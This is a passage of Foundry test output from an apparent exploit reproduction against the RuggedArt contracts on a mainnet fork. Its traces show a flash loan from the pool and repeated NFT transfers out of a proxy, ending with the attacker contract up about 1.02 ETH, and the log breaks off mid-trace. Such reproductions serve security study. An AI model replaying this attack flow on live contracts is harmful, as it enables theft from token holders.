No files changed, compilation skipped

Ran 1 test for test/RuggedArt_exp.sol:ContractTest
[PASS] testExploit() (gas: 7102116)
Logs:
  Attacker Eth balance before attack:: 0
  Attacker Eth balance after attack:: 1023851896415447765

Traces:
  [19491] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
    │   └─ ← [Return]
    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
    │   └─ ← [Return]
    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
    │   └─ ← [Return]
    └─ ← [Stop]

  [8882910] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   │   │   │   @ 0x7c7ec41f0fe372c56501c68fd98a087764885a027016bf9746b8fd54fe0df27d: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8d: 0 → 5163
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 532 → 531
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604eb: 5163 → 5010
    │   │   │   │   │   │   @ 0x74c76a0c8ee1c2289e32559cf79108454b22784ff63867bea7537ff0d3ee7a98: 531 → 12
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001ce2bb501f3faa8a41 → 0x00000000000000000000000000000000000000000000001cd4da996b98468a41
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 1 → 2
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f2: 5010 → 0
    │   │   │   │   │   │   @ 0xb775dab96be1e8e7c15e77effa45a1c6e6f5c40d88035a5fc55eadbf8002a215: 12 → 1
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2347)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2347)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x0c8e29e5c3c5e5a955d23e008a0f020d8d53d6cafdaed173b7ee3d98026d9203: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cd4da996b98468a41 → 0x00000000000000000000000000000000000000000000001cc6f9e2b7f0e28a41
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 2 → 3
    │   │   │   │   │   │   @ 0x262e9b50ffe96ff958522c1428dcecf32edee71305112cf4472d1abf8f392f1d: 530 → 18
    │   │   │   │   │   │   @ 0x27d8f81e1f58be87ee553445d6f3373ee873f21effca55f9a399fe791f264291: 18 → 2
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 531 → 530
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0x00000000000000000000000000000000000000000000000029a2241af62c0000
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8e: 0 → 2347
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f1: 6614 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604f1: 2347 → 6614
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3145)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3145)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0xe18e36c8e0ab66bd4eb03141b8fc83ed98cc10b4ce5d11d8d95cc8feef0e9848: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xff96918f9e4eb4105edb678ff6730927f18f7b6b9cb080b689169527fce78d4b: 529 → 16
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 3 → 4
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000029a2241af62c0000 → 0x0000000000000000000000000000000000000000000000003782dace9d900000
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f0: 8418 → 0
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8f: 0 → 3145
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cc6f9e2b7f0e28a41 → 0x00000000000000000000000000000000000000000000001cb9192c04497e8a41
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604ef: 3145 → 8418
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 530 → 529
    │   │   │   │   │   │   @ 0x89a9edcc164e1fdaa7edb3689fd08bc9655a5ff49922743da29d68a2b8aa8a74: 16 → 3
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2740)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2740)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 529 → 528
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604e8: 2740 → 6652
    │   │   │   │   │   │   @ 0x095824e88dea8d46c87f19b8a6713c69c79d72628d4cca70e6a6bac672024011: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 4 → 5
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d90: 0 → 2740
    │   │   │   │   │   │   @ 0xd609a12af96f381f54941be9dcd7bbee7751067de615944a5b44d4a5ef7da0ff: 528 → 9
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ef: 6652 → 0
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cb9192c04497e8a41 → 0x00000000000000000000000000000000000000000000001cab387550a21a8a41
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000003782dace9d900000 → 0x0000000000000000000000000000000000000000000000004563918244f40000
    │   │   │   │   │   │   @ 0x3f37188561f05222e10316ba525fc5d5dcb8078ac115fb3db3271db36d087659: 9 → 4
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1878)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1878)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cab387550a21a8a41 → 0x00000000000000000000000000000000000000000000001c9d57be9cfab68a41
    │   │   │   │   │   │   @ 0xdac4bedf7739b64c307454762b548637a94337646a9b79d97a181db75c0f9faf: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x872e7f9f7462ef7a0e5efd05076b73b65d2ce8f2ada2ecddc8404a11d481b8c6: 46 → 5
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 528 → 527
    │   │   │   │   │   │   @ 0x658e1034b789a97e688c050855069ec25b7a5f7e8584b95899fb44495c01edf0: 527 → 46
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c6050d: 1878 → 3951
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000004563918244f40000 → 0x00000000000000000000000000000000000000000000000053444835ec580000
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d91: 0 → 1878
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 5 → 6
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ee: 3951 → 0
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6901)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6901)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 6 → 7
    │   │   │   │   │   │   @ 0x617cb31547f437c7de7c40f0c8d3403e5581ba9130efde86c6ed1ec79aae0c3a: 481 → 6
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000053444835ec580000 → 0x0000000000000000000000000000000000000000000000006124fee993bc0000
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c9d57be9cfab68a41 → 0x00000000000000000000000000000000000000000000001c8f7707e953528a41
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ed: 1549 → 0
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 527 → 526
    │   │   │   │   │   │   @ 0xa5b58a888a85842b891a760e4c76260aeafebf6e5cba275046506c0ed4973e49: 526 → 481
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606c0: 6901 → 1549
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d92: 0 → 6901
    │   │   │   │   │   │   @ 0x74ac6e6de663790d1fa67c929abf27631d19f0eab8be5711cb672475f886477b: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3061)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3061)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000006124fee993bc0000 → 0x0000000000000000000000000000000000000000000000006f05b59d3b200000
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606b1: 3061 → 942
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d93: 0 → 3061
    │   │   │   │   │   │   @ 0x9dc68992587370ea2610c4afc050f53202bac18c08fcce1050ad31cb1c1ebd7a: 525 → 466
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 526 → 525
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ec: 942 → 0
    │   │   │   │   │   │   @ 0xea9262cafadd8bfc07ea22f5a9768a91a14a222ac5be91ac103413514df66635: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x005c6ed66846fc515ed43c3a7e1e64071c3e3de822e0aa78beb8011e21b028c7: 466 → 7
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 7 → 8
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c8f7707e953528a41 → 0x00000000000000000000000000000000000000000000001c81965135abee8a41
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1922)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1922)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x5210cb14e405bd2df6c11d4d4e9843e881d7a3b94df4ddacbbb4d6e9dd105ac3: 524 → 459
    │   │   │   │   │   │   @ 0xe244fb5fa0726d3288990465e011945de3c92b84ad73f9120b1478d38a848c98: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000006f05b59d3b200000 → 0x0000000000000000000000000000000000000000000000007ce66c50e2840000
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606aa: 1922 → 5507
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c81965135abee8a41 → 0x00000000000000000000000000000000000000000000001c73b59a82048a8a41
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606eb: 5507 → 0
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 8 → 9
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d94: 0 → 1922
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 525 → 524
    │   │   │   │   │   │   @ 0xf02b4f5de0eca8225398cd400fd9ef67aa21c25f9048703d3cd6531cdf6289ae: 459 → 8
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5301)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 5301)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d95: 0 → 5301
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 9 → 10
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c73b59a82048a8a41 → 0x00000000000000000000000000000000000000000000001c65d4e3ce5d268a41
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ea: 736 → 0
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000007ce66c50e2840000 → 0x0000000000000000000000000000000000000000000000008ac7230489e80000
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 524 → 523
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606b9: 5301 → 736
    │   │   │   │   │   │   @ 0x7668c75f3f92f192135b8e5a2b43c6d6ebe6e285a2a3a5806f8b0fc775beda29: 523 → 474
    │   │   │   │   │   │   @ 0xc44e133743d3b6295b51b8fa55477e753b7bed529f4012071e26ceeef19ce249: 474 → 9
    │   │   │   │   │   │   @ 0x84288e8807e18f9bb068ee64f35b6c8f0658750997493a087aadee42e9297dd7: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 454)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 454)
